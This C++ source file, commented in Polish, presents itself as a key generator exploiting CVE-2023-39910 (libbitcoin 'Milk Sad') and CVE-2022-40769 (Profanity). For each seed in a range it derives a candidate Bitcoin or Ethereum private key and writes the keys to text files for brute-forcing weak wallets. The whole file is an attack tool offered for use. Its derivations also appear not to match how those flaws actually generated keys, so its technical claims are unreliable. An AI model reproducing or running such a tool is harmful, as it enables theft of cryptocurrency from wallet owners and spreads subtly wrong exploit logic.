// ===============================
// CVE-2023-39910 + CVE-2022-40769 - GENERATOR KLUCZY DO TXT
// ===============================
// Kompilacja: g++ -O3 -march=native -o keygen keygen.cpp -std=c++17
// Użycie: ./keygen [start_seed] [end_seed] [output.txt]
// Przykład: ./keygen 0 1000000 keys.txt
// ===============================

#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <iomanip>
#include <random>
#include <cstdint>
#include <chrono>

// ================================================================
// CVE-2023-39910 - LIBBITCOIN EXPLORER (MILK SAD)
// mt19937 → BEZPOŚREDNIO 32-bajtowy klucz prywatny
// ================================================================
std::string generate_priv_libbitcoin(uint32_t seed) {
    std::mt19937 rng(seed);
    
    unsigned char priv[32];
    for (int i = 0; i < 8; i++) {
        uint32_t r = rng();
        priv[i*4] = (r >> 24) & 0xFF;
        priv[i*4+1] = (r >> 16) & 0xFF;
        priv[i*4+2] = (r >> 8) & 0xFF;
        priv[i*4+3] = r & 0xFF;
    }
    
    std::stringstream ss;
    for (int i = 0; i < 32; i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)priv[i];
    }
    return ss.str();
}

// ================================================================
// CVE-2022-40769 - PROFANITY (ETHEREUM VANITY)
// LCG: state = state * 1103515245 + 12345
// ================================================================
std::string generate_priv_profanity(uint32_t seed) {
    uint32_t state = seed;
    unsigned char priv[32];
    
    for (int i = 0; i < 8; i++) {
        state = state * 1103515245 + 12345;
        uint32_t r = state;
        priv[i*4] = (r >> 24) & 0xFF;
        priv[i*4+1] = (r >> 16) & 0xFF;
        priv[i*4+2] = (r >> 8) & 0xFF;
        priv[i*4+3] = r & 0xFF;
    }
    
    std::stringstream ss;
    for (int i = 0; i < 32; i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)priv[i];
    }
    return ss.str();
}

// ================================================================
// FORMATOWANIE CZASU
// ================================================================
std::string format_time(double seconds) {
    if (seconds < 60) {
        return std::to_string((int)seconds) + "s";
    } else if (seconds < 3600) {
        int minutes = (int)(seconds / 60);
        int secs = (int)(seconds) % 60;
        return std::to_string(minutes) + "m " + std::to_string(secs) + "s";
    } else {
        int hours = (int)(seconds / 3600);
        int minutes = ((int)(seconds) % 3600) / 60;
        return std::to_string(hours) + "h " + std::to_string(minutes) + "m";
    }
}

// ================================================================
// MAIN
// ================================================================
int main(int argc, char* argv[]) {
    std::cout << "========================================\n";
    std::cout << "CVE-2023-39910 + CVE-2022-40769 - GENERATOR KLUCZY\n";
    std::cout << "========================================\n\n";
    
    uint32_t start_seed = 0;
    uint32_t end_seed = 1000000;
    std::string output_file = "keys.txt";
    
    if (argc >= 2) start_seed = std::stoul(argv[1]);
    if (argc >= 3) end_seed = std::stoul(argv[2]);
    if (argc >= 4) output_file = argv[3];
    
    uint64_t total_seeds = (uint64_t)end_seed - (uint64_t)start_seed;
    
    std::cout << "Zakres: " << start_seed << " - " << end_seed << "\n";
    std::cout << "Liczba kluczy: " << total_seeds << "\n";
    std::cout << "Plik wyjściowy: " << output_file << "\n\n";
    
    // ================================================================
    // CVE-2023-39910 - Libbitcoin
    // ================================================================
    std::cout << "[1] CVE-2023-39910 (Libbitcoin/Milk Sad) - generowanie...\n";
    std::string lib_file = "libbitcoin_" + output_file;
    std::ofstream f_lib(lib_file);
    if (!f_lib.is_open()) {
        std::cerr << "Błąd: nie można otworzyć " << lib_file << std::endl;
        return 1;
    }
    
    auto start_time = std::chrono::high_resolution_clock::now();
    uint64_t count = 0;
    
    for (uint32_t seed = start_seed; seed < end_seed; seed++) {
        f_lib << generate_priv_libbitcoin(seed) << "\n";
        count++;
        
        if (count % 100000 == 0) {
            auto now = std::chrono::high_resolution_clock::now();
            double elapsed = std::chrono::duration<double>(now - start_time).count();
            double speed = count / elapsed;
            std::cout << "\r  " << count << "/" << total_seeds 
                      << " | " << (int)speed << " keys/s   " << std::flush;
        }
    }
    f_lib.close();
    
    auto end_time = std::chrono::high_resolution_clock::now();
    double elapsed_lib = std::chrono::duration<double>(end_time - start_time).count();
    std::cout << "\n  Zapisano: " << lib_file << " (" << format_time(elapsed_lib) << ")\n\n";
    
    // ================================================================
    // CVE-2022-40769 - Profanity
    // ================================================================
    std::cout << "[2] CVE-2022-40769 (Profanity) - generowanie...\n";
    std::string prof_file = "profanity_" + output_file;
    std::ofstream f_prof(prof_file);
    if (!f_prof.is_open()) {
        std::cerr << "Błąd: nie można otworzyć " << prof_file << std::endl;
        return 1;
    }
    
    start_time = std::chrono::high_resolution_clock::now();
    count = 0;
    
    for (uint32_t seed = start_seed; seed < end_seed; seed++) {
        f_prof << generate_priv_profanity(seed) << "\n";
        count++;
        
        if (count % 100000 == 0) {
            auto now = std::chrono::high_resolution_clock::now();
            double elapsed = std::chrono::duration<double>(now - start_time).count();
            double speed = count / elapsed;
            std::cout << "\r  " << count << "/" << total_seeds 
                      << " | " << (int)speed << " keys/s   " << std::flush;
        }
    }
    f_prof.close();
    
    end_time = std::chrono::high_resolution_clock::now();
    double elapsed_prof = std::chrono::duration<double>(end_time - start_time).count();
    std::cout << "\n  Zapisano: " << prof_file << " (" << format_time(elapsed_prof) << ")\n\n";
    
    // ================================================================
    // PODSUMOWANIE
    // ================================================================
    std::cout << "========================================\n";
    std::cout << "✅ GOTOWE!\n";
    std::cout << "========================================\n";
    std::cout << "CVE-2023-39910: " << lib_file << "\n";
    std::cout << "CVE-2022-40769: " << prof_file << "\n";
    std::cout << "Liczba kluczy: " << total_seeds << "\n";
    std::cout << "Czas: " << format_time(elapsed_lib + elapsed_prof) << "\n";
    std::cout << "========================================\n";
    
    return 0;
}
